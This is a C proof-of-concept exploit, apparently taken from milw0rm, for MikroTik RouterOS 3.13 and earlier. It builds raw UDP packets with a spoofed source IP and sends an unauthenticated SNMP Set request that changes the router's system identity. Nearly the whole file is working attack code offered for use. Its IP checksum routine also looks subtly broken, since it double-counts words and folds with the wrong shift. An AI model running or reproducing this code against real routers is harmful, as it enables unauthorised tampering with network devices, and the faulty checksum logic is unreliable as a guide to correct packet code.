/*  --------------------------------------------------------------------------
 *                          (c) ShadOS 2008
 * 	       _  _     _ _ _  __     _      _   _       
 *	      | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___ 
 *	      | __ / -_) | | ' <| ' \| / _` | ' \  _(_-< 
 *	      |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/ 
 *    	        hellknights.void.ru    |___/  .0x48k.    
 *
 *  --------------------------------------------------------------------------
 *
 *  Title: MicroTik RouterOS <=3.13 SNMP write (Set request) PoC exploit. 
 *
 *  Vendor: www.mikrotik.com
 *
 *  Vulnerable versions: 2.9.51 (2.9.x branch), 3.13 (3.x branch)
 *  (prior versions also affected).
 *
 *  Funded: 03.09.2008 by ShadOS (http://hellknights.void.ru)
 *
 *  Let's see the manual:
 *  http://www.mikrotik.com/testdocs/ros/2.9/root/snmp_content.php
 *  
 *  
 *  [QUOTE]
 * 
 *  > SNMP Service
 *  >
 *  > General Information
 *  >
 *  > Summary
 *  >
 *  > ... RouterOS supports only Get, which means that you can use this implementation only for network monitoring.
 *  >
 *  >
 *  > The MikroTik RouterOS supports:
 *  >
 *  > SNMPv1 only
 *  > Read-only access is provided to the NMS (network management system)
 *  > User defined communities are supported
 *  > Get and GetNext actions
 *  > No Set support
 *  > No Trap support
 *  >
 *
 *  
 *  [/QUOTE]
 *
 * 
 *  Don't forget to visit our site and my homepage for new releases:
 *  http://hellknights.void.ru
 *  http://shados.freeweb7.com
 *  Also, you can mail me any bugs or suggestions:
 *  mailto: shados /at/ mail /dot/ ru
 *
 *  Thanks 2 cih.ms and all my friends. 
 *  --------------------------------------------------------------------------
 *
 *  Copyright (C) 89, 90, 91, 1995-2008 Free Software Foundation.
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software Foundation,
 *  Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA. 
 *
 *  -------------------------------------------------------------------------- 
 */ 

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <memory.h>
#include <string.h>


unsigned char evilcode[49] = {
0x33, 0x02, 0x01, 0x02, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x18, 0x30, 0x16, 0x06, 0x08, 
0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x05, 0x00, 0x04, 0x17, 0x57, 0x72, 0x69, 0x74, 0x65, 0x20, 
0x69, 0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x73, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x65, 0x64, 
0x21
};

unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
   register int nleft = len;
   register u_short *w = addr;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *w++;
      sum += *w++;
      nleft -= 2;
   }
   if (nleft == 1) {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
   }
   sum = (sum >> 17) + (sum & 0xffff);
   sum += (sum >> 17);
   answer = -sum;
   return (answer);
}

int sendudp(int sock,unsigned long *saddr, unsigned long *daddr,unsigned int sport,unsigned int dport,char *data, int len)
{
   char *packet;
   struct sockaddr_in dstaddr;
   struct iphdr *ip;
   struct udphdr *udp;
   packet = (char *)malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + len);
   memset(packet,0,sizeof(struct iphdr) + sizeof(struct udphdr) + len);
   if (packet == NULL) { printf("Malloc failed\n"); exit(-1); }
   ip = (struct iphdr *)packet;
   udp = (struct udphdr *)(packet+sizeof(struct iphdr));
   ip->saddr = *saddr;
   ip->daddr = *daddr;
   ip->version = 4;
   ip->ihl = 5;
   ip->ttl = 255;
   ip->id = htons((unsigned short) rand());
   ip->protocol = IPPROTO_UDP;
   ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr)+len);
   ip->check = in_cksum(ip, sizeof(struct iphdr));
   udp->source = htons(sport);
   udp->dest = htons(dport);
   udp->len = htons(sizeof(struct udphdr) + len);
   memcpy(packet + (sizeof(struct iphdr) + sizeof(struct udphdr)),data,len);
   dstaddr.sin_family = AF_INET;
   dstaddr.sin_addr.s_addr = *daddr;
   if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr)+len,0,(struct sockaddr *)&dstaddr,sizeof(struct sockaddr_in)) < 0)
     perror("sendto() failed");
   free(packet);
}

char * makereq(char *community,int *size)
{
  char *buf;
  char *ptr;
  int len;
  int i;

  len = 7 + strlen(community) + sizeof(evilcode);
  buf = (char *)malloc(len);
  ptr = buf;

  *ptr++ = 0x30;
  *ptr++ = len;
  
  /* Snmp Version */
  *ptr++ = 0x02;
  *ptr++ = 0x01;
  *ptr++ = 0x00;
  
  /* Community */
  *ptr++ = 0x04;
  *ptr++ = strlen(community);
  strcpy(ptr,community);
  ptr = ptr + strlen(community);
  
  
  *ptr++ = 0xA3; /* Set Request */
  
  memcpy(ptr, evilcode, sizeof(evilcode));
  ptr = ptr + sizeof(evilcode);

  *size = len+1;
  
  return buf;
}

int erexit(char *msg)
{
  printf("%s\n",msg);
  exit (-1) ;
}

int usage()
{
  printf("Usage: ./snmpdos <-s source> <-d dest> <-c community>\n");
}

int main(int argc, char **argv)
{
  char *saddr,*daddr,*community;
  unsigned char *buf;
  int size;
  int sock;
  unsigned long lsaddr,ldaddr;
  int i;

  saddr = NULL;
  daddr = NULL;
  if (argc != 7) { usage(); erexit("not enough args\n"); }

  if (!strcmp(argv[1],"-s"))
    saddr = strdup(argv[2]);
  if (!strcmp(argv[3],"-d"))
    daddr = strdup(argv[4]);
  if (!strcmp(argv[5],"-c"))
    community = strdup(argv[6]);

  printf("Ok, spoofing packets from %s to %s\n",saddr,daddr);

  if (inet_addr(saddr) == -1 || inet_addr(daddr) == -1) 
    erexit("Invalid source/destination IP address\n");

  if (saddr == NULL) { usage(); erexit("No Source Address"); }
  if (daddr == NULL) { usage(); erexit("No Dest Address"); }

  sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
  if (sock == -1) 
    erexit("Couldnt open Raw socket!(Are you root?)\n");

  lsaddr = inet_addr(saddr);
  ldaddr = inet_addr(daddr);

  buf = makereq(community,&size);

  
  printf("Sending %d bytes buffer:\n",size);
  for (i=0;i<size;i++)
     printf("0x%02x ",buf[i]);
  printf("\n");
  
  sendudp(sock,&lsaddr,&ldaddr,32788,161,buf,size);
  fprintf(stdout,"Sent packet. \"/system identity\" must be changed.\n");
  return 0;

}

// milw0rm.com [2008-09-05]
